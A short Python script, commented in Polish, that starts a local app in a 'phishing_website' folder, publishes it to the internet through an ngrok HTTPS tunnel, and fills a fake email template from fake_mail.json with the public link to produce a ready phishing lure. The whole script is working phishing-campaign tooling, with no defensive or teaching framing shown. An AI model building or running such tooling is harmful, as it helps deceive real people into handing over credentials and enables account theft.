from pyngrok import ngrok
import json
import subprocess
import time
import re
#odpalenie serwera 
cmd_line = "python3 ./phishing_website/app.py"
subprocess.Popen(cmd_line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
https_tunnel = ngrok.connect(5000, bind_tls=True)
print(https_tunnel.public_url)

# obsluga jsona z mailami
fake_mail_text = []
with open('fake_mail.json') as f:
    data = json.load(f)
    for tex in data['fake_mail']:
        fake_mail_text.append(tex['text'])
phishing_link = https_tunnel.public_url
print(fake_mail_text[1].replace('{phishing_link}', phishing_link))


time.sleep(1000)
